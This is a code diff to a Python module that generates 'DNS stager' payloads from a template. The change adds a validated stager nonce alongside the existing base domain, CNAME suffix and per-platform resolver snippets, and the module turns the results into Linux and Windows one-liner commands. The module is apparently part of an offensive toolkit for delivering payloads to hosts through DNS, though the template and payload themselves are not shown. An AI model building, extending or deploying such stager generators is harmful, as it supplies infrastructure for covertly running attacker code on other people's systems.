@@ -18,6 +18,7 @@ except NameError:
 _PLACEHOLDERS = (
     '{{BASE_DOMAIN}}',
     '{{CNAME_SUFFIX}}',
+    '{{STAGER_NONCE}}',
     '{{SFB_ARGS}}',
     '{{RESOLVER_SNIPPET}}',
 )
@@ -156,6 +157,34 @@ def _normalize_cname_label(value):
     return value
 
 
+def _is_base32_label(label):
+    allowed = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567')
+    try:
+        text = label.upper()
+    except AttributeError:
+        return False
+    for ch in text:
+        if ch not in allowed:
+            return False
+    return True
+
+
+def _normalize_stager_nonce(value):
+    value = _ensure_ascii_text(value, 'stager_nonce').strip()
+    if not value:
+        raise ValueError('stager_nonce required')
+    value = value.strip('.')
+    if not value:
+        raise ValueError('stager_nonce required')
+    if '.' in value:
+        raise ValueError('stager_nonce must be a single label')
+    if len(value) > 63:
+        raise ValueError('stager_nonce must be <= 63 characters')
+    if _is_base32_label(value):
+        raise ValueError('stager_nonce must include non-base32 characters')
+    return value.lower()
+
+
 def _build_cname_suffix(base_domain, cname_label):
     cname_label = _normalize_cname_label(cname_label)
     if cname_label:
@@ -205,10 +234,12 @@ def _format_args_list(args):
     return '[' + ', '.join(parts) + ']'
 
 
-def _render_template(template_text, base_domain, cname_suffix, sfb_args, resolver_snippet):
+def _render_template(template_text, base_domain, cname_suffix, stager_nonce,
+                     sfb_args, resolver_snippet):
     rendered = template_text
     rendered = rendered.replace('{{BASE_DOMAIN}}', base_domain)
     rendered = rendered.replace('{{CNAME_SUFFIX}}', cname_suffix)
+    rendered = rendered.replace('{{STAGER_NONCE}}', stager_nonce)
     rendered = rendered.replace('{{SFB_ARGS}}', sfb_args)
     rendered = rendered.replace('{{RESOLVER_SNIPPET}}', resolver_snippet)
     for token in _PLACEHOLDERS:
@@ -217,16 +248,19 @@ def _render_template(template_text, base_domain, cname_suffix, sfb_args, resolve
     return rendered
 
 
-def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet, cname_label=None):
+def render_dns_stager(template_path, base_domain, sfb_args, resolver_snippet,
+                      cname_label=None, stager_nonce=None):
     template_text = _read_ascii(template_path)
     base_domain = _normalize_domain(base_domain)
     cname_suffix = _build_cname_suffix(base_domain, cname_label)
+    stager_nonce = _normalize_stager_nonce(stager_nonce)
     sfb_args = _format_args_list(sfb_args or [])
     resolver_snippet = _ensure_ascii_text(resolver_snippet, 'resolver snippet')
     return _render_template(
         template_text,
         base_domain,
         cname_suffix,
+        stager_nonce,
         sfb_args,
         resolver_snippet,
     )
@@ -259,7 +293,8 @@ def build_one_liner(payload, platform):
 
 
 def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
-                      template_path=None, cname_label=None):
+                      template_path=None, cname_label=None,
+                      stager_nonce=None):
     repo_root = _repo_root()
     if output_dir is None:
         output_dir = repo_root
@@ -276,6 +311,7 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
         sfb_args,
         LINUX_RESOLVER_SNIPPET,
         cname_label=cname_label,
+        stager_nonce=stager_nonce,
     )
     windows_payload = render_dns_stager(
         template_path,
@@ -283,6 +319,7 @@ def write_dns_stagers(base_domain, sfb_args=None, output_dir=None,
         sfb_args,
         WINDOWS_RESOLVER_SNIPPET,
         cname_label=cname_label,
+        stager_nonce=stager_nonce,
     )
     linux_cmd = build_one_liner(linux_payload, platform='posix')
     windows_cmd = build_one_liner(windows_payload, platform='windows')
